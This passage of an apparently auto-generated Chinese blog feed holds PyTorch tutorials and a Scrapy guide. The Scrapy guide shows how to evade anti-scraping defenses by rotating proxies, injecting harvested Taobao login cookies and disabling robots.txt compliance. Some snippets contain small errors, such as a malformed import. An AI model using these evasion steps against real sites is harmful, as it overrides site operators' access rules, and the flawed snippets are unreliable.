    <content type="html"><![CDATA[<h1 id="transforms基本操作">1. transforms基本操作</h1><p>在PyTorch中，<code>torchvision.transforms</code>模块提供了一系列用于图像预处理和数据增强的工具，可以在数据加载过程中对图像进行各种转换操作。这些转换操作可以帮助模型更好地泛化，并提高模型的性能。以下是一些常用的图像转换操作：</p><ol type="1"><li><strong>常见转换操作</strong>：<ul><li><code>ToTensor()</code>：将PIL图像或numpy数组转换为张量。</li><li><code>ToPILImage()</code>：将张量转换为PIL图像。</li><li><code>Normalize(mean, std)</code>：对图像进行标准化处理，减去均值并除以标准差。<ul><li><code>input[channel] = (input[channel] - mean[channel]) / std[channel]</code></li></ul></li><li><code>Resize(size)</code>：调整图像尺寸。</li><li><code>CenterCrop(size)</code>：对图像进行中心裁剪。</li><li><code>RandomCrop(size)</code>：对图像进行随机裁剪。</li><li><code>RandomHorizontalFlip()</code>：以给定的概率随机水平翻转图像。</li><li><code>RandomVerticalFlip()</code>：以给定的概率随机垂直翻转图像。</li></ul></li><li><strong>高级转换操作</strong>：<ul><li><code>ColorJitter(brightness=0, contrast=0, saturation=0, hue=0)</code>：随机调整图像的亮度、对比度、饱和度和色调。</li><li><code>RandomRotation(degrees, resample=False, expand=False, center=None)</code>：随机旋转图像。</li><li><code>RandomAffine(degrees, translate=None, scale=None, shear=None, resample=False, fillcolor=0)</code>：随机仿射变换。</li><li><code>RandomPerspective(distortion_scale=0.5, p=0.5, interpolation=3)</code>：随机透视变换。</li><li><code>RandomErasing(p=0.5, scale=(0.02, 0.33), ratio=(0.3, 3.3), value=0, inplace=False)</code>：随机擦除图像的一部分。</li></ul></li><li><strong>自定义转换</strong>：你也可以使用<code>transforms.Lambda</code>自定义转换操作，将一个自定义的函数应用到图像上。</li></ol><p>这些转换操作可以通过<code>transforms.Compose</code>组合在一起，以形成一个转换管道，然后在数据加载时应用于图像。以下是一个简单的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms<br><br><span class="hljs-comment"># 定义转换操作</span><br>transform = transforms.Compose([<br>    transforms.Resize(<span class="hljs-number">256</span>),<br>    transforms.CenterCrop(<span class="hljs-number">224</span>),<br>    transforms.RandomHorizontalFlip(),<br>    transforms.ToTensor(),<br>    transforms.Normalize(mean=[<span class="hljs-number">0.485</span>, <span class="hljs-number">0.456</span>, <span class="hljs-number">0.406</span>],<br>                         std=[<span class="hljs-number">0.229</span>, <span class="hljs-number">0.224</span>, <span class="hljs-number">0.225</span>])<br>])<br><br><span class="hljs-comment"># 应用转换操作到数据集</span><br>transformed_dataset = YourDataset(transform=transform)<br></code></pre></td></tr></table></figure><p>在这个示例中，图像将首先被调整大小为256x256像素，然后进行中心裁剪为224x224像素，接着以0.5的概率进行水平翻转，最后被转换为张量并进行标准化处理。</p><h1 id="tensor数据类型">2. Tensor数据类型</h1><p>Tensor数据类型在深度学习中非常重要，因为它们提供了一种高效的数据表示形式，可以在GPU上进行并行计算，加速模型训练和推理过程。以下是一些使用Tensor数据类型的主要原因：</p><ol type="1"><li><p><strong>高效的数值计算</strong>：Tensor数据类型是针对数值计算优化的，可以利用底层的高性能数值计算库（如CUDA或BLAS）来加速数值操作。这使得在GPU上进行并行计算成为可能，大大加快了模型训练和推理速度。</p></li><li><p><strong>自动求导</strong>：PyTorch的Tensor支持自动求导功能，可以自动计算张量上的梯度。这对于训练神经网络和其他需要梯度信息的优化算法非常重要，如梯度下降法、反向传播等。</p></li><li><p><strong>灵活的形状和维度</strong>：Tensor数据类型支持灵活的形状和维度，可以轻松处理不同大小和形状的数据，适用于各种类型的神经网络架构和数据集。</p></li><li><p><strong>与深度学习框架集成</strong>：Tensor数据类型是PyTorch和其他深度学习框架的核心数据类型，因此在使用这些框架时，使用Tensor数据类型能够与框架的其他功能（如模型定义、优化器、损失函数等）无缝集成。</p></li><li><p><strong>GPU加速</strong>：Tensor数据类型可以在GPU上进行计算，利用GPU的并行计算能力来加速模型训练和推理。这对于处理大规模数据集和复杂模型非常重要。</p></li></ol><p>总之，Tensor数据类型是深度学习中不可或缺的一部分，它们提供了一个高效的数值计算和自动求导框架，使得深度学习模型的开发和训练变得更加简单、灵活和高效。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TensorBoard</title>
    <link href="/2024/03/03/Python/PyTorch/TensorBoard/"/>
    <url>/2024/03/03/Python/PyTorch/TensorBoard/</url>
    
    <content type="html"><![CDATA[<p>TensorBoard 是一个由 TensorFlow提供的可视化工具，用于展示机器学习实验的结果和进展。它可以帮助你理解、调试和优化模型。虽然它最初是为TensorFlow 设计的，但你也可以在 PyTorch 中使用 TensorBoard来可视化模型训练和评估过程。</p><p>以下是 TensorBoard 主要功能的简要介绍：</p><ol type="1"><li><strong>可视化模型图</strong>：TensorBoard可以将神经网络模型的结构可视化为图形，使你能够清晰地理解模型的层次结构和连接方式。</li><li><strong>训练过程监控</strong>：你可以使用 TensorBoard记录和可视化训练过程中的指标，如损失值、准确率等。这有助于实时监控模型的性能并进行调整。</li><li><strong>可视化参数分布和梯度</strong>：TensorBoard可以帮助你观察模型参数和梯度的分布情况，以便更好地理解模型的训练过程和稳定性。</li><li><strong>图像、音频、文本数据可视化</strong>：除了数值数据外，TensorBoard还支持可视化图像、音频、文本等非数值数据，这对于图像分类、语音识别等任务非常有用。</li><li><strong>嵌入向量可视化</strong>：如果你在训练过程中使用了嵌入层（embedding），TensorBoard可以帮助你将嵌入向量在高维空间中可视化，从而更好地理解数据的分布和相似性。</li></ol><p>在 PyTorch 中使用 TensorBoard，你通常需要使用<code>torch.utils.tensorboard</code> 模块。以下是一个简单的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br><span class="hljs-comment"># 创建一个 TensorBoard 的记录器</span><br>writer = SummaryWriter()<br><br><span class="hljs-comment"># 在训练过程中记录损失值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    loss = train(...)<br>    writer.add_scalar(<span class="hljs-string">&#x27;Loss/train&#x27;</span>, loss, i)<br><br><span class="hljs-comment"># 记录模型的结构</span><br>model = ...<br>writer.add_graph(model, input_to_model=torch.randn(<span class="hljs-number">1</span>, input_size))<br><br><span class="hljs-comment"># 关闭记录器</span><br>writer.close()<br></code></pre></td></tr></table></figure><p>然后你可以使用 TensorBoard 命令来启动 TensorBoard服务器，并在浏览器中查看可视化结果：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">tensorboard --logdir=logs<br></code></pre></td></tr></table></figure><p>这将启动一个 TensorBoard 服务器，默认监听端口为6006。你可以在浏览器中打开 <code>http://localhost:6006</code> 来查看TensorBoard 的界面，并浏览训练过程中的各种可视化结果。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据加载</title>
    <link href="/2024/03/01/Python/PyTorch/%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD/"/>
    <url>/2024/03/01/Python/PyTorch/%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="dataset">1. Dataset</h1><p>PyTorch的<code>Dataset</code>类是一个抽象类，用于表示数据集的一个非常灵活和强大的方式。在PyTorch中，<code>torch.utils.data.Dataset</code>是表示数据集的基类，需要用户继承并重写两个主要的方法来自定义数据加载方式：<code>__len__</code>和 <code>__getitem__</code>。</p><h2 id="len__-方法"><code>__len__</code> 方法</h2><p>这个方法需要返回数据集中的样本数。当你调用<code>len(dataset)</code>时，实际上是在调用这个方法。</p><h2 id="getitem__-方法"><code>__getitem__</code> 方法</h2><p>这个方法需要接收一个索引（<code>index</code>），然后返回数据集中对应索引的样本。这是数据加载的核心，允许数据集以任意的方式存储样本，只要你可以通过索引获取到样本。</p><h2 id="自定义数据集示例">自定义数据集示例</h2><p>下面是一个自定义数据集的简单示例，它简单地存储了一些数据和标签，然后通过索引返回它们。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> Dataset<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomDataset</span>(<span class="hljs-title class_ inherited__">Dataset</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data, labels</span>):<br>        self.data = data<br>        self.labels = labels<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, index</span>):<br>        sample = self.data[index]<br>        label = self.labels[index]<br>        <span class="hljs-keyword">return</span> sample, label<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>data</code> 和 <code>labels</code>应该是Python列表（或其他适合你的数据的容器），其中包含你的数据和标签。</p><h1 id="dataloader">2. Dataloader</h1><p>一旦你定义了自己的数据集，你可以使用<code>torch.utils.data.DataLoader</code>来实现对数据的批处理、打乱和多线程加载等操作。<code>DataLoader</code>接收一个<code>Dataset</code>实例作为输入，使数据加载变得非常高效和灵活。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><br><span class="hljs-comment"># 假设我们已经创建了一个数据集实例</span><br>dataset = CustomDataset(data, labels)<br><br><span class="hljs-comment"># 使用DataLoader来加载数据</span><br>dataloader = DataLoader(dataset, batch_size=<span class="hljs-number">4</span>, shuffle=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 然后你可以在训练循环中遍历dataloader来使用数据</span><br><span class="hljs-keyword">for</span> data, labels <span class="hljs-keyword">in</span> dataloader:<br>    <span class="hljs-comment"># 进行训练相关的操作</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>通过使用<code>Dataset</code>和<code>DataLoader</code>，PyTorch提供了一种非常灵活和强大的方式来处理不同来源和格式的数据，同时优化了数据加载的效率。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pytorch安装</title>
    <link href="/2024/03/01/Python/PyTorch/Pytorch%E5%AE%89%E8%A3%85/"/>
    <url>/2024/03/01/Python/PyTorch/Pytorch%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="安装anaconda">1. 安装Anaconda</h1><p>官网地址：<a href="https://www.anaconda.com/download/">Free Download| Anaconda</a></p><h1 id="创建虚拟环境">2. 创建虚拟环境</h1><ul><li><p>图形界面</p></li><li><p>命令行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 新建环境<br>conda create –n 虚拟环境名字 python=版本<br># 查看存在的所有环境<br>conda env list<br></code></pre></td></tr></table></figure></li></ul><h1 id="安装显卡驱动">3. 安装显卡驱动</h1><ul><li><p>安装最新显卡驱动：<ahref="https://www.nvidia.cn/geforce/drivers/">NVIDIA GeForce 驱动程序 -N 卡驱动 | NVIDIA</a></p></li><li><p>查看驱动版本：<code>nvidia-smi</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403011525805.png"alt="image-20240301143849279" /><figcaption aria-hidden="true">image-20240301143849279</figcaption></figure></li></ul><h1 id="安装pytorch">4. 安装pytorch</h1><p>官网地址：<ahref="https://pytorch.org/">PyTorch</a>（复制命令后在所需环境中进行安装）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403011525806.png"alt="image-20240301144648865" /><figcaption aria-hidden="true">image-20240301144648865</figcaption></figure><h1 id="验证">5. 验证</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403011525807.png"alt="image-20240301152239138" /><figcaption aria-hidden="true">image-20240301152239138</figcaption></figure><p><strong>参考资料：</strong></p><ol type="1"><li><ahref="https://blog.csdn.net/weixin_44752340/article/details/130542629">2023最新pytorch安装（超详细版）</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Scrapy应对反爬</title>
    <link href="/2023/12/17/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Scrapy%E5%BA%94%E5%AF%B9%E5%8F%8D%E7%88%AC/"/>
    <url>/2023/12/17/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Scrapy%E5%BA%94%E5%AF%B9%E5%8F%8D%E7%88%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><p>主要讲解Scrapy的中间件技术，以及如何通过Scrapy应对一些反爬机制。例如，通过Scrapy结合IP代理应对IP反爬机制，通过Scrapy结合Selenium库应对动态渲染反爬机制。</p><h1 id="中间件技术概述">1. 中间件技术概述</h1><p>中间件是介入到Scrapy的爬虫处理机制的代码文件，用户可以通过添加代码来处理发送给爬虫的响应及爬虫产生的实体（Item）和请求。使用中间件可以在爬虫的请求发起之前或者请求返回之后对数据进行定制化修改，从而开发出适应不同情况的爬虫。代码位于<code>middlewares.py</code></p><ul><li>下载器中间件（常用）</li><li>爬虫中间件</li></ul><h2 id="下载器中间件">1.1 下载器中间件</h2><p>下载器中间件是用于全局修改Scrapy的请求和响应的一个轻量、底层的系统。通俗来讲，通过下载器中间件可以设置IP代理、设置Cookie、设置Selenium库爬虫模式等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Enable or disable downloader middlewares</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span><br><span class="hljs-comment"># 数字越小，优先级越高</span><br>DOWNLOADER_MIDDLEWARES = &#123;<br>   <span class="hljs-string">&quot;xinlang.middlewares.XinlangDownloaderMiddleware&quot;</span>: <span class="hljs-number">543</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="爬虫中间件">1.2 爬虫中间件</h2><p>主要处理网址和文件夹<code>spiders</code>中的爬虫文件，通常用来处理异常报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Enable or disable spider middlewares</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span><br>SPIDER_MIDDLEWARES = &#123;<br>   <span class="hljs-string">&quot;xinlang.middlewares.XinlangSpiderMiddleware&quot;</span>: <span class="hljs-number">543</span>,<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="爬取搜狗图片ip代理">2. 爬取搜狗图片（IP代理）</h1><p><strong>使用Requests库批量下载图片：</strong></p><ul><li>分析Ajax动态请求找到真正的网址</li><li>解析JSON格式数据</li><li>批量下载图片</li><li>添加IP代理爬取图片</li><li>批量爬取多页图片</li></ul><p><strong>使用Scrapy框架批量下载图片：</strong></p><ul><li><p>创建爬虫项目</p></li><li><p>添加IP代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># middlewares.py</span><br><span class="hljs-comment"># 下载器中间件</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>        proxy = requests.get(<span class="hljs-string">&#x27;讯代理API链接&#x27;</span>).text<br>        proxy = proxy.strip()  <span class="hljs-comment"># 重要，因为要把看不见的换行符等空格给清除掉</span><br>        proxies = <span class="hljs-string">&quot;http://&quot;</span> + proxy  <span class="hljs-comment"># 这里和直接使用requests库的写法不太一样</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;提取ip为&#x27;</span> + proxy)<br>        request.meta[<span class="hljs-string">&quot;proxy&quot;</span>] = proxies  <span class="hljs-comment"># 核心代码</span><br>        time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 休息5秒，防止提取IP过快，超过频率限制</span><br></code></pre></td></tr></table></figure></li><li><p>编写爬虫文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">import</span> time<br><br>headers=&#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0&#x27;</span>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SougouSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;sougou&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;sogou.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://pic.sogou.com/napi/pc/searchList?mode=13&amp;dm=4&amp;cwidth=1536&amp;cheight=864&amp;start=0&amp;xml_len=48&quot;</span><br>                  <span class="hljs-string">&quot;&amp;query=%E5%A3%81%E7%BA%B8&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        js=response.json()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> js[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&#x27;items&#x27;</span>]:<br>            title=i[<span class="hljs-string">&quot;title&quot;</span>]<br>            title=title.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>            img_url=i[<span class="hljs-string">&quot;picUrl&quot;</span>]<br>            <span class="hljs-comment"># 可以使用ImagePipeline进行下载</span><br>            path=<span class="hljs-string">&#x27;images\\&#x27;</span>+title+<span class="hljs-string">&#x27;.png&#x27;</span><br>            res=requests.get(img_url,headers=headers)<br>            file=<span class="hljs-built_in">open</span>(path,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>            file.write(res.content)<br>            file.close()<br><br>            <span class="hljs-built_in">print</span>(title+<span class="hljs-string">&#x27;下载成功！&#x27;</span>)<br>            time.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure></li><li><p>修改设置文件</p></li><li><p>运行项目</p></li></ul><h1 id="模拟登录淘宝cookie">3. 模拟登录淘宝（Cookie）</h1><p>注：由于淘宝升级了反爬机制，该代码在测试时已失效。</p><ul><li><p>创建爬虫项目</p></li><li><p>中间件文件中添加Cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 获取cookie值，写在中间件文件开头部分，就只会在启动爬虫项目时执行一次</span><br>browser = webdriver.Edge(<span class="hljs-string">r&#x27;F:\Anaconda\install\envs\spider\MicrosoftWebDriver.exe&#x27;</span>)<br>browser.get(<span class="hljs-string">&#x27;https://login.taobao.com/member/login.jhtml&#x27;</span>)<br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;login&quot;]/div[1]/i&#x27;</span>).click()  <span class="hljs-comment"># 切换成二维码模式</span><br>time.sleep(<span class="hljs-number">15</span>)  <span class="hljs-comment"># 休息15秒，留够时间进行扫码登录</span><br>cookies = browser.get_cookies()  <span class="hljs-comment"># 获取cookie</span><br>browser.quit()  <span class="hljs-comment"># 获取到cookie后退出模拟浏览器，可能会稍微要等一会</span><br><br><span class="hljs-comment"># 下载器中间件</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>        <span class="hljs-comment"># Called for each request that goes through the downloader</span><br>        <span class="hljs-comment"># middleware.</span><br><br>        <span class="hljs-comment"># Must either:</span><br>        <span class="hljs-comment"># - return None: continue processing this request</span><br>        <span class="hljs-comment"># - or return a Response object</span><br>        <span class="hljs-comment"># - or return a Request object</span><br>        <span class="hljs-comment"># - or raise IgnoreRequest: process_exception() methods of</span><br>        <span class="hljs-comment">#   installed downloader middleware will be called</span><br>        request.cookies=cookies<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure></li><li><p>编写爬虫文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TbSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;tb&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;taobao&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://s.taobao.com/search?q=%E5%8D%8E%E4%B8%BA&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(response.text)<br>        data_list = response.xpath(<span class="hljs-string">&#x27;//*[@class=&quot;Content--contentInner--QVTcU0M&quot;]/div&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(data_list)<br>        <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>            title = data.xpath(<span class="hljs-string">&#x27;./a/div/div[1]/div[2]/div/span/text()&#x27;</span>).extract_first()<br>            price = data.xpath(<span class="hljs-string">&#x27;./a/div/div[1]/div[3]/span[2]/text()&#x27;</span>).extract_first()<br>            <span class="hljs-built_in">print</span>(title, price)<br></code></pre></td></tr></table></figure></li><li><p>修改设置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Obey robots.txt rules</span><br>ROBOTSTXT_OBEY = <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># Disable cookies (enabled by default)</span><br>COOKIES_ENABLED = <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># Enable or disable downloader middlewares</span><br><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span><br>DOWNLOADER_MIDDLEWARES = &#123;<br>   <span class="hljs-string">&quot;taobao.middlewares.TaobaoDownloaderMiddleware&quot;</span>: <span class="hljs-number">543</span>,<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>运行爬虫项目</p></li></ul><h1 id="爬取第一财经新闻selenium">4. 爬取第一财经新闻（Selenium）</h1><ul><li><p>创建爬虫项目</p></li><li><p>中间件文件中添加Selenium库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 下载器中间件</span><br><span class="hljs-comment"># 类的初始化方法，用于激活模拟浏览器 </span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.browser = webdriver.Edge(<span class="hljs-string">r&#x27;F:\Anaconda\install\envs\spider\MicrosoftWebDriver.exe&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_request</span>(<span class="hljs-params">self, request, spider</span>):<br>        <span class="hljs-comment"># Called for each request that goes through the downloader</span><br>        <span class="hljs-comment"># middleware.</span><br>        self.browser.get(request.url)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        body = self.browser.page_source<br>        <span class="hljs-keyword">return</span> HtmlResponse(url=self.browser.current_url, body=body,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, request=request)<br></code></pre></td></tr></table></figure></li><li><p>编写爬虫文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">YicaiSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&quot;yicai&quot;</span><br>    allowed_domains = [<span class="hljs-string">&quot;yicai.com&quot;</span>]<br>    start_urls = [<span class="hljs-string">&quot;https://www.yicai.com/search?keys=%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        data_list = response.xpath(<span class="hljs-string">&#x27;//*[@id=&quot;searchlist&quot;]/a&#x27;</span>)<br>        count = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>            url = <span 